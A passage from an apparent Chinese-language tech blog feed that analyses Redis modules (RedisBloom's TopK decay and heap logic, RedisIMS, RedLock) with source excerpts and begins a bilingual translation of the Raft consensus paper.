<code>T-Digest</code> 的存储流程如下：</p><ul><li>尝试进行数据压缩；</li><li>存储对应的 <code>T-Digest</code> 的所有元信息（包括压缩值，最大最小值，容量，节点数等）；</li><li>存储对应的 <code>T-Digest</code> 的节点信息（已经 merge 节点的值和权重值）；</li></ul><h4 id="5-4-2、AOF的持久化"><a href="#5-4-2、AOF的持久化" class="headerlink" title="5.4.2、AOF的持久化"></a>5.4.2、AOF的持久化</h4><p>AOF 的存储过程没有使用自定义的命令，而直接使用了 <code>RESTORE</code> 命令进行持久化：</p><ul><li>相关函数：<code>RMUtil_DefaultAofRewrite</code>；</li><li>具体格式：<code>RESTORE key 0 buffer buffer_len</code> ；</li></ul><h2 id="六、TopK（头部K元素）"><a href="#六、TopK（头部K元素）" class="headerlink" title="六、TopK（头部K元素）"></a>六、TopK（头部K元素）</h2><p><code>TopK</code> 用于展示前 <code>K</code> 个分数最高的数据，数据存储方式参考了 <code>Count-Min Sketch (最小计数草图)</code> 的设计实现，可以容纳的有效数据量依赖于初始化时指定的 <code>width</code> 和 <code>depth</code> ，并且引入了一种分数衰减机制来实现对老数据的清理。</p><h3 id="6-1、相关命令"><a href="#6-1、相关命令" class="headerlink" title="6.1、相关命令"></a>6.1、相关命令</h3><p>以下命令仅参考当时的最新的代码，详细的准确命令请参考 <a href="https://redis.io/commands/topk.add/">社区命令文档地址</a> 。</p><ul><li>topk.reserve : 初始化一个 <code>TopK</code>；</li><li>topk.add : 向 <code>TopK</code> 中添加元素，支持添加多个元素；</li><li>topk.incrby : 按增量增加一个或多个元素的计数；</li><li>topk.query : 检查一个或多个项目是否在 <code>TopK</code> 中；</li><li>topk.count : 返回项目的计数；</li><li>topk.list : 返回 <code>Top K</code> 列表中项目的完整列表;</li><li>topk.info : 返回 <code>TopK</code> 的数量、宽度、深度和衰减值；</li></ul><h3 id="6-2、编码结构"><a href="#6-2、编码结构" class="headerlink" title="6.2、编码结构"></a>6.2、编码结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TOPK_DECAY_LOOKUP_TABLE 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">topk</span> &#123;<br>    <span class="hljs-type">uint32_t</span> k;            <span class="hljs-comment">// 要保留的常见项目的数量</span><br>    <span class="hljs-type">uint32_t</span> width;        <span class="hljs-comment">// 每个数组中保留的计数器数，默认宽度为 8</span><br>    <span class="hljs-type">uint32_t</span> depth;        <span class="hljs-comment">// 数组的数量，默认深度为 7</span><br>    <span class="hljs-type">double</span> decay;          <span class="hljs-comment">// 默认衰减系数为 0.9</span><br><br>    Bucket *data;          <span class="hljs-comment">// 存储的 Bucket 的内存块指针，Bucket 数量为 width * depth</span><br>    HeapBucket *heap;      <span class="hljs-comment">// 存储 k 个大小的 HeapBucket 数组指针，第一个最小，最后一个最大</span><br>    <span class="hljs-type">double</span> lookupTable[TOPK_DECAY_LOOKUP_TABLE];  <span class="hljs-comment">// 预计算的衰减系数的数组，容量256，值内容为：pow(decay, i)</span><br>&#125; TopK;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Bucket</span> &#123;<br>    <span class="hljs-type">uint32_t</span> fp;           <span class="hljs-comment">// 插入元素的指纹信息 </span><br>    <span class="hljs-type">counter_t</span> count;       <span class="hljs-comment">// 对应指纹的分数</span><br>&#125; Bucket;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">HeapBucket</span> &#123;<br>    <span class="hljs-type">uint32_t</span> fp;           <span class="hljs-comment">// 对应元素的指纹信息</span><br>    <span class="hljs-type">uint32_t</span> itemlen;      <span class="hljs-comment">// 对应元素的原始长度</span><br>    <span class="hljs-type">char</span> *item;            <span class="hljs-comment">// </span><br>    <span class="hljs-type">counter_t</span> count;       <span class="hljs-comment">// 对应元素的分数</span><br>&#125; HeapBucket;<br></code></pre></td></tr></table></figure><h3 id="6-3、哈希规则"><a href="#6-3、哈希规则" class="headerlink" title="6.3、哈希规则"></a>6.3、哈希规则</h3><ul><li>哈希算法： <code>MurmurHash2</code> ；</li><li>具体流程：<ul><li>获取元素的指纹信息；</li><li>依次遍历整个 <code>TopK</code> 的不同深度中对应索引处的值，判断数据是否存在；<ul><li>使用对应的深度值 <code>i</code> 作为哈希种子，计算对应元素的哈希值；</li><li>哈希值取模 <code>TopK 的宽度</code>，计算出对应元素在当前深度中的索引；</li><li>判断对应索引处的信息是否为插入的元素，以便于应对插入与查询操作；</li></ul></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 元素指纹的计算方式</span><br><span class="hljs-type">uint32_t</span> fp = <span class="hljs-built_in">MurmurHash2</span>(item, itemlen, <span class="hljs-number">1919</span>);<br><br><span class="hljs-comment">// 元素 Bucket 的计算方式</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; topk-&gt;depth; ++i) &#123;<br>    <span class="hljs-type">uint32_t</span> loc = <span class="hljs-built_in">MurmurHash2</span>(item, itemlen, i) % topk-&gt;width;<br>    Bucket *runner = topk-&gt;data + i * topk-&gt;width + loc;<br><br>    <span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-4、TopK堆更新机制"><a href="#6-4、TopK堆更新机制" class="headerlink" title="6.4、TopK堆更新机制"></a>6.4、TopK堆更新机制</h3><ul><li><strong>触发条件</strong>：<ul><li>操作元素的分数值大于 <code>TopK</code> 中的最小值；</li></ul></li><li><strong>更新方式</strong>：<ul><li>如果对应元素已经存在：更新对应元素的分数，然后重新排序对应元素的位置直到结束的位置；</li><li>如果对应元素不存在：剔除 <code>TopK</code> 中第一个元素，将其替换为本次变更的元素，然后对整个 <code>TopK</code> 进行重新排序；</li></ul></li><li><strong>更新细节</strong>：<ul><li>相关函数：<code>heapifyDown</code> ；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapifyDown</span><span class="hljs-params">(HeapBucket *array, <span class="hljs-type">size_t</span> len, <span class="hljs-type">size_t</span> start)</span> </span>&#123;<br>    <span class="hljs-type">size_t</span> child = start;<br><br>    <span class="hljs-comment">// check whether larger than children</span><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span> || (len - <span class="hljs-number">2</span>) / <span class="hljs-number">2</span> &lt; child) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    child = <span class="hljs-number">2</span> * child + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ((child + <span class="hljs-number">1</span>) &lt; len &amp;&amp; (array[child].count &gt; array[child + <span class="hljs-number">1</span>].count)) &#123;<br>        ++child;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (array[child].count &gt; array[start].count) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// swap while larger than child</span><br>    HeapBucket top = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memcpy</span>(&amp;top, &amp;array[start], <span class="hljs-built_in">sizeof</span>(HeapBucket));<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;array[start], &amp;array[child], <span class="hljs-built_in">sizeof</span>(HeapBucket));<br>        start = child;<br><br>        <span class="hljs-keyword">if</span> ((len - <span class="hljs-number">2</span>) / <span class="hljs-number">2</span> &lt; child) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        child = <span class="hljs-number">2</span> * child + <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> ((child + <span class="hljs-number">1</span>) &lt; len &amp;&amp; (array[child].count &gt; array[child + <span class="hljs-number">1</span>].count)) &#123;<br>            ++child;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (array[child].count &lt; top.count);<br>    <span class="hljs-built_in">memcpy</span>(&amp;array[start], &amp;top, <span class="hljs-built_in">sizeof</span>(HeapBucket));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-5、衰减算法"><a href="#6-5、衰减算法" class="headerlink" title="6.5、衰减算法"></a>6.5、衰减算法</h3><ul><li><strong>衰减的考量</strong>：<ul><li>之前写入的老数据可能长时间不在访问，但是它们还会一直占用着对应的存储位置，如果老数据之前的分数较高，则其可能长时间位于 <code>TopK</code> 中；</li><li>随着数据量的增加，新写入的数据可能会和被计算到与老数据相同的位置上，如果位置相同，但是指纹却不同，此时我们无法对现有的分数进行变更，但是我们可以尝试不断衰减老数据的分数，直到其为零后，我们就可以将其指纹以及分数替换成新的数据值；</li><li>通过这种方式我们可以实现变化的 <code>TopK</code> 排行，并且解决了老数据占位的问题；</li></ul></li><li><strong>触发衰减的条件（必须全部满足）</strong>：<ul><li>执行元素插入操作，相关命令：<code>topk.add</code> ， <code>topk.incrby</code>；</li><li>根据元素而计算的存储位置处非空且对应的指纹和元素的指纹不匹配；</li></ul></li><li><strong>衰减的机制</strong>：<ul><li>临时 <code>delay</code> 的值：<ul><li>对应位置的分数 <code>小于 256</code> ，则值为 <code>topk-&gt;lookupTable[count]</code> ；</li><li>对应位置的分数 <code>大于 256</code> ，则值为 <code>pow(topk-&gt;lookupTable[255], count/255 * topk-&gt;lookupTable[count%256])</code> ;</li></ul></li><li>随机值 <code>chance</code> ： 等于 <code>rand() / (double)(2^32-1)</code> ；<ul><li>如果随机值 <code>chance</code> 小于 <code>decay</code> 则将 <code>原始分数减1</code>；</li></ul></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-type">uint32_t</span> local_incr = increment;<br><span class="hljs-keyword">for</span> (; local_incr &gt; <span class="hljs-number">0</span>; --local_incr) &#123;<br>    <span class="hljs-type">double</span> decay;<br>    <span class="hljs-keyword">if</span> (*countPtr &lt; TOPK_DECAY_LOOKUP_TABLE) &#123;<br>        decay = topk-&gt;lookupTable[*countPtr];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//  using precalculate lookup table to save cpu</span><br>        decay = <span class="hljs-built_in">pow</span>(topk-&gt;lookupTable[TOPK_DECAY_LOOKUP_TABLE - <span class="hljs-number">1</span>],<br>                    (*countPtr / TOPK_DECAY_LOOKUP_TABLE) *<br>                        topk-&gt;lookupTable[*countPtr % TOPK_DECAY_LOOKUP_TABLE]);<br>    &#125;<br>    <span class="hljs-type">double</span> chance = <span class="hljs-built_in">rand</span>() / (<span class="hljs-type">double</span>)RAND_MAX;<br>    <span class="hljs-keyword">if</span> (chance &lt; decay) &#123;<br>        --*countPtr;<br>        <span class="hljs-keyword">if</span> (*countPtr == <span class="hljs-number">0</span>) &#123;<br>            runner-&gt;fp = fp;<br>            *countPtr = local_incr;<br>            maxCount = <span class="hljs-built_in">max</span>(maxCount, *countPtr);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-5、持久化"><a href="#6-5、持久化" class="headerlink" title="6.5、持久化"></a>6.5、持久化</h3><h4 id="6-5-1、RDB的持久化"><a href="#6-5-1、RDB的持久化" class="headerlink" title="6.5.1、RDB的持久化"></a>6.5.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个 <code>TopK</code> 的存储流程如下：</p><ul><li>尝试进行数据压缩；</li><li>存储对应的 <code>TopK</code> 的所有元信息（包括保留分数最大的数量，数组的计数数量，数组的计数深度，衰减值等）；</li><li>存储对应的 <code>TopK</code> 的数据信息（包括所有的数据及分数信息，<code>TopK</code> 中的数据及其分数信息）；</li></ul><h4 id="6-5-2、AOF的持久化"><a href="#6-5-2、AOF的持久化" class="headerlink" title="6.5.2、AOF的持久化"></a>6.5.2、AOF的持久化</h4><p>AOF 的存储过程没有使用自定义的命令，而直接使用了 <code>RESTORE</code> 命令进行持久化：</p><ul><li>相关函数：<code>RMUtil_DefaultAofRewrite</code>；</li><li>具体格式：<code>RESTORE key 0 buffer buffer_len</code> ；</li></ul><h2 id="七、参考链接："><a href="#七、参考链接：" class="headerlink" title="七、参考链接："></a>七、参考链接：</h2><ul><li><a href="https://haslab.uminho.pt/cbm/files/dbloom.pdf?spm=a2c4g.11186623.0.0.5a5d7e53oDkkj8&file=dbloom.pdf">Scalable Bloom Filters</a></li><li><a href="https://titanssword.github.io/2018-02-23-Bloom%20Filter%20and%20Count-Min%20Sketch.html#Count-Min-Sketch">Bloom Filter 和　Count-Min Sketch 介绍</a></li><li><a href="https://blog.bcmeng.com/post/tdigest.html">TDigest 算法原理</a></li><li><a href="https://www.sciencedirect.com/science/article/pii/S2665963820300403">The t-digest: Efficient estimates of distributions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> BloomFilter </tag>
            
            <tag> CuckooFilter </tag>
            
            <tag> Count-Min Sketch </tag>
            
            <tag> T-Digest </tag>
            
            <tag> TopK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisIMS</title>
      <link href="/2021/10/04/redismodule-redisims/"/>
      <url>/2021/10/04/redismodule-redisims/</url>
      
        <content type="html"><![CDATA[<p><code>RedisIMS</code> 是一款支持了 <code>If Modified Since（IMS）</code> 模式的数据访问方案。<code>If-Modified-Since</code> 经常在 <code>HTTP</code> 访问过程被使用，通常是为了避免不断从服务器中拉取大量的重复的数据，以节省网络流量开销。将这种方式用作 <code>Redis</code> 中主要应该也是为了解决 <code>大key</code> 的问题，当前该模块仅支持 <code>string</code> 类型。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/Clement-Jean/RedisIMS">https://github.com/Clement-Jean/RedisIMS</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>redisims.get : 如果数据在指定时间之后被修改了，则返回实际存储的值，否则直接返回空；</li><li>redisims.set : 更新特定 <code>key</code> 的 <code>value</code> 信息，然后更新对应的上次更新时间元信息；</li><li>redisims.exists : 从元信息中查找对应的 <code>key</code> 是否有上次更新的时间记录；</li></ul><h3 id="2-2、存储模型"><a href="#2-2、存储模型" class="headerlink" title="2.2、存储模型"></a>2.2、存储模型</h3><p>该模块引入了一个元信息的 <code>key</code> 来存储操作 <code>用户key</code> 的上次的操作时间，特殊 key 的格式设计为：</p><ul><li>数据名称 : <code>MTIME</code> ；</li><li>数据类型 : <code>hash</code> ；</li><li>数据成员 :<ul><li><code>field</code> : 实际操作的 <code>用户key</code> ；</li><li><code>value</code> : 记录的用户上次传入的操作时间 ；</li></ul></li></ul><h3 id="2-3、执行逻辑"><a href="#2-3、执行逻辑" class="headerlink" title="2.3、执行逻辑"></a>2.3、执行逻辑</h3><ul><li><code>redisims.get</code> 执行逻辑 :<ul><li>从特殊key <code>MTIME</code> 中检索对应 <code>用户key</code> 的上次更新时间信息（调用 <code>HGET</code> 命令）；<ul><li>无上次更新时间，直接返回  <code>用户key</code> 的实际值信息（调用 <code>GET</code> 命令）；</li><li>有上次更新时间，则需要将 <code>Redis</code> 中记录的上次更新时间与用户传入的上次更新时间做对比：<ul><li>缓存的时间更大 : 返回 <code>用户key</code> 的真实值（调用 <code>GET</code> 命令）；</li><li>缓存的时间更小(相等) : 返回空；</li></ul></li></ul></li></ul></li><li><code>redisims.set</code> 执行逻辑 :<ul><li>设置 <code>用户key</code> 的值；</li><li>更新 <code>元信息key</code> 中对应 <code>用户key</code> 的时间信息（调用 <code>HSET</code> 命令）；</li></ul></li><li><code>redisims.exists</code> 执行逻辑 : <ul><li>在 <code>元信息key</code> 中检索 <code>用户key</code> 的时间信息，返回存在或不存在（调用 <code>HEXISTS</code> 命令）；</li></ul></li></ul><h3 id="2-4、持久化"><a href="#2-4、持久化" class="headerlink" title="2.4、持久化"></a>2.4、持久化</h3><p>该模块未提供任何的数据持久化方式，当实例重启后数据会丢失。</p><h2 id="三、思考"><a href="#三、思考" class="headerlink" title="三、思考"></a>三、思考</h2><ul><li><code>IMS</code> 的这种方式从设计理念上来看能很大程度的减少不必要的网络资源开销，从使用姿势上也能看出来，在业务客户端还有一层缓存，而此时 <code>Redis</code> 的角色可以是一个后端缓存或者是一个数据库；</li><li>考虑到 Redis 中其实不推荐使用 <code>大Value</code> ，因为对于 <code>大Value</code> 的操作有可能会影响业务的访问，集群场景下还会导致分片数据不均衡等情况，因此如果能够从源头上直接封解决掉 <code>大Value</code>，那么这种方式的意义可能就不十分明显了，<code>小Value</code> 的获取相比于直接返回空，这两者的差异极小；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedisIMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedLock</title>
      <link href="/2021/09/01/redismodule-redlock/"/>
      <url>/2021/09/01/redismodule-redlock/</url>
      
        <content type="html"><![CDATA[<p><code>RedLock</code> 是一款基于 <code>RedisModule</code> 实现的分布式锁模块，该模块提供了写&#x2F;读锁的操作接口，相比于使用 Redis 的现有命令进行支持，这个模块的命令语义更明确，且有利于进行流量区分与筛选，在使用中能够很好的区分开其他流量与锁操作相关的流量。整体的模块实现比较简单，阅读相对比较容易。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/wujunwei/redlock/">https://github.com/wujunwei/redlock/</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>slock.lock : 新增加一个写锁，可以指定该锁的过期时间；</li><li>slock.unlock : 解锁之前的一个写锁，只有具有相同的客户端id的链接才可以解锁；</li><li>slock.rlock : 新增加一个读锁，可以指定该锁的过期时间，多个客户端同时获取写锁时会影响该锁的读的引用计数；</li><li>slock.runlock : 解锁之前的一个读锁，实际是减少对应锁的引用计数，当引用计数减少为0时，删除该key；</li><li>slock.info : 获取锁的信息；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// RedLock结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">slock</span> &#123;<br>    <span class="hljs-type">mstime_t</span> lock_time;                  <span class="hljs-comment">// 上锁的时间，单位毫秒</span><br>    <span class="hljs-type">int</span> is_write;                        <span class="hljs-comment">// 当前锁的特征，读锁 或 写锁</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> reader_count;     <span class="hljs-comment">// 读锁的引用计数，只有当锁是读锁时才会用到</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> write_client_id;  <span class="hljs-comment">// 上锁的客户端id</span><br>&#125; SLock;<br></code></pre></td></tr></table></figure><h3 id="2-3、持久化"><a href="#2-3、持久化" class="headerlink" title="2.3、持久化"></a>2.3、持久化</h3><h4 id="2-3-1、RDB的持久化"><a href="#2-3-1、RDB的持久化" class="headerlink" title="2.3.1、RDB的持久化"></a>2.3.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中。</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SLockRdbSave</span><span class="hljs-params">(RedisModuleIO *rdb, <span class="hljs-type">void</span> *value)</span> </span>&#123;<br>    SLock *sl = value;<br>    <span class="hljs-built_in">RedisModule_SaveUnsigned</span>(rdb, sl-&gt;write_client_id);<br>    <span class="hljs-built_in">RedisModule_SaveSigned</span>(rdb, sl-&gt;lock_time);<br>    <span class="hljs-built_in">RedisModule_SaveSigned</span>(rdb, sl-&gt;is_write);<br>    <span class="hljs-built_in">RedisModule_SaveUnsigned</span>(rdb, sl-&gt;reader_count);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-2、AOF的持久化"><a href="#2-3-2、AOF的持久化" class="headerlink" title="2.3.2、AOF的持久化"></a>2.3.2、AOF的持久化</h4><p>AOF 的存储过程相当于把现有的锁转换成 <code>slock.lock</code> 和 <code>slock.rlock</code> 命令进行存储。（注意：转储的时候没有记录对应锁的过期时间，重新加载的所有锁都不会过期，算是一个异常）；</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SLockAofRewrite</span><span class="hljs-params">(RedisModuleIO *aof, RedisModuleString *key, <span class="hljs-type">void</span> *value)</span> </span>&#123;<br>    SLock *sl = value;<br>    <span class="hljs-keyword">if</span> (sl-&gt;is_write) &#123;<br>        <span class="hljs-built_in">RedisModule_EmitAOF</span>(aof, <span class="hljs-string">&quot;SLOCK.LOCK&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, key);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> count = sl-&gt;reader_count;<br>    <span class="hljs-keyword">while</span> (count--)&#123;<br>        <span class="hljs-built_in">RedisModule_EmitAOF</span>(aof, <span class="hljs-string">&quot;SLOCK.rLOCK&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、问题与思考"><a href="#三、问题与思考" class="headerlink" title="三、问题与思考"></a>三、问题与思考</h2><h3 id="3-1、问题"><a href="#3-1、问题" class="headerlink" title="3.1、问题"></a>3.1、问题</h3><ul><li>写锁的释放方式依赖于加锁的客户端释放或者到达过期时间，但是如果加锁的客户端异常断开之后，重新连接之后新客户端的id与加锁的客户端id也不同了，这时就只能等待对应锁过期释放，这里关于加锁与释放锁的关系不可靠，极容易出现问题；</li><li>AOF 的持久化过程中没有覆盖过期属性，结合上一个问题，服务重启之后锁永远都不会被释放；</li></ul><h3 id="3-2、思考"><a href="#3-2、思考" class="headerlink" title="3.2、思考"></a>3.2、思考</h3><ul><li>该锁模块没有封装更为高级的接口或命令，相比于Redis现有的命令，没有特别明显的优势，我们完全可以使用以下的命令来替换对应该模块中的命令，在替换的过程中由于读锁和写锁的 value 格式不同，可以通过设置不同的 key 的格式来进行区分。<ul><li>slock.lock :<ul><li>思路 : 使用 string 类型数据替换即可；</li><li>替换为 : <code>set key_w value nx px expire</code></li></ul></li><li>slock.unlock : <ul><li>思路 : 解锁之前需要判断加锁的归属，因此需要使用 lua 脚本；</li><li>替换为 : <code>eval &quot;if redis.call(&#39;get&#39;, KEYS[1]) == ARGV[1] then return redis.call(&#39;del&#39;, KEYS[1]) else return 0 end&quot; 1 key_w value</code></li></ul></li><li>slock.rlock : <ul><li>思路 : 保持多个客户端访问同一个读锁，又要确保能够表示引用计数，可以使用 string 数据类型并使用数字 value ；</li><li>替换为 : <code>incr key_r</code></li></ul></li><li>slock.runlock : 替换为 <code>decr key_r</code></li><li>slock.info : 替换为 <code>get key_r</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedLock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - In Search of an Understandable Consensus Algorithm (Extended Version)</title>
      <link href="/2021/05/01/raft/"/>
      <url>/2021/05/01/raft/</url>
      
        <content type="html"><![CDATA[<div><p><a href="https://raft.github.io/raft.pdf">《In Search of an Understandable Consensus Algorithm (Extended Version)》</a> 直译过来就是 《寻找可理解的共识算法（扩展版）》，这篇文章中详细介绍了 Raft 算法的设计初衷以及其主要的设计实现，这是一篇学习共识算法的必读的一片论文。</p></div><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Raft is a consensus algorithm for managing a replicated log. It produces a result equivalent to (multi-)Paxos, and it is as efficient as Paxos, but its structure is different from Paxos; this makes Raft more understandable than Paxos and also provides a better foundation for building practical systems. In order to enhance understandability, Raft separates the key elements of consensus, such as leader election, log replication, and safety, and it enforces a stronger degree of coherency to reduce the number of states that must be considered. Results from a user study demonstrate that Raft is easier for students to learn than Paxos. Raft also includes a new mechanism for changing the cluster membership, which uses overlapping majorities to guarantee safety.</p><p>Raft 是一种用来管理日志复制的共识算法。它的性能和 (multi-)Paxos 是一样的，并且和Paxos一样高效，但是它的结构和 Paxos 不一样；这使得 Raft 更容易理解并且也为构建实用系统提供了更好的基础。为了增强可理解性，Raft 将共识算法分为了几个部分，例如领导选取（leader selection），日志复制（log replication）和安全性（safety），同时它使用了更强的一致性来减少了必须要考虑的状态数量。从用户学习的结果来看，Raft 比 Paxos 更容易学习。Raft 还包括了一种新的机制来动态改变集群成员，它使用重叠大多数（overlapping majorities）来保证安全。</p><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Consensus algorithms allow a collection of machines to work as a coherent group that can survive the failures of some of its members. Because of this, they play a key role in building reliable large-scale software systems. Paxos [15, 16] has dominated the discussion of consensus algorithms over the last decade: most implementations of consensus are based on Paxos or influenced by it, and Paxos has become the primary vehicle used to teach students about consensus.</p><p>共识算法允许一群机器像一个整体一样工作，即使其中的一些成员发生故障也不会出现问题。基于这一点，它在构建可靠的大规模软件系统的过程中起着关键的作用。Paxos[15, 16]一直主导着过去十年间对共识算法的讨论：许多共识算法的实现都是以Paxos为基础或者受到它的影响，并且Paxos已经成为了用来教授学生关于共识算法的主要工具。</p><p>Unfortunately, Paxos is quite difficult to understand, in spite of numerous attempts to make it more approachable. Furthermore, its architecture requires complex changes to support practical systems. As a result, both system builders and students struggle with Paxos.</p><p>不幸的是，Paxos太难以理解了，尽管已经做了很多尝试想使它变得更加平易近人。并且，为了方便构建实际的系统，它的结构也需要做出非常复杂的改变。因此，系统架构师和学生都对Paxos感到很痛苦。</p><p>After struggling with Paxos ourselves, we set out to find a new consensus algorithm that could provide a better foundation for system building and education. Our approach was unusual in that our primary goal was understandability: could we define a consensus algorithm for practical systems and describe it in a way that is significantly easier to learn than Paxos? Furthermore, we wanted the algorithm to facilitate the development of intuitions that are essential for system builders. It was important not just for the algorithm to work, but for it to be obvious why it works.</p><p>在我们和Paxos经历了一番痛苦挣扎之后，我们开始寻找一种新的共识算法来为系统的构建和教学提供更好的基础。我们的首要目标比较特殊，为了让它更加易于理解：我们能否为实际的系统构建一个比Paxos更加易于理解的共识算法？此外，我们希望该算法能够培养系统构建者的开发直觉。而这对系统构建者是必不可少的。重要的是不仅算法要起作用，而且要清楚它为什么会起作用。</p><p>The result of this work is a consensus algorithm called Raft. In designing Raft we applied specific techniques to improve understandability, including decomposition (Raft separates leader election, log replication, and safety) and state space reduction (relative to Paxos, Raft reduces the degree of nondeterminism and the ways servers can be inconsistent with each other). A user study with 43 students at two universities shows that Raft is significantly easier to understand than Paxos: after learning both algorithms, 33 of these students were able to answer questions about Raft better than questions about Paxos.</p><p>这项工作的结果就是一个叫做Raft的共识算法。在设计Raft的时候，我们使用了特定的技术来提高可理解性，包括分割（Raft分离了领导者选举、日志复制和安全性）以及状态空间的减少（和Paxos相比，Raft降低了不确定性的程度以及服务器之间数据不一致的方式）。在对两所大学的43名学生的用户调研后表明，Raft比Paxos更加容易理解。在同时学习了两种方法之后，其中的33名学生回答Raft的问题要比回答Paxos的更好。</p><p>Raft is similar in many ways to existing consensus algorithms (most notably, Oki and Liskov’s Viewstamped Replication [29, 22]), but it has several novel features:</p><p>Raft在很多方面和现存的共识算法类似，但是它也有以下这些独特的特性：</p><ul><li>Strong leader: Raft uses a stronger form of leadership than other consensus algorithms. For example, log entries only flow from the leader to other servers. This simplifies the management of the replicated log and makes Raft easier to understand.</li><li>Leader election: Raft uses randomized timers to elect leaders. This adds only a small amount of mechanism to the heartbeats already required for any consensus algorithm, while resolving conflicts simply and rapidly.</li><li>Membership changes: Raft’s mechanism for changing the set of servers in the cluster uses a new joint consensus approach where the majorities of two different configurations overlap during transitions. This allows the cluster to continue operating normally during configuration changes.</li></ul><br /><ul><li>强领导者：Raft使用了比其他共识算法更强的领导形式。例如，日志条目只能从领导者流向其他服务器。这简化了对复制日志的管理，并使Raft更易于理解。</li><li>领导者选举：Raft使用随机的时钟来选举领导者。这只是在共识算法原有的心跳检测的基础上增加了少量的特殊机制。使得冲突解决变得更加简单快速。</li><li>成员变更：Raft使用了一种新的联合共识的方法来处理集群成员变更的问题，处于调整过程中的两种不同的配置集群中大多数机器会有重叠，这就使得集群在成员变换的时候依然可以继续工作。</li></ul><p>We believe that Raft is superior to Paxos and other consensus algorithms, both for educational purposes and as a foundation for implementation. It is simpler and more understandable than other algorithms; it is described completely enough to meet the needs of a practical system; it has several open-source implementations and is used by several companies; its safety properties have been formally specified and proven; and its efficiency is comparable to other 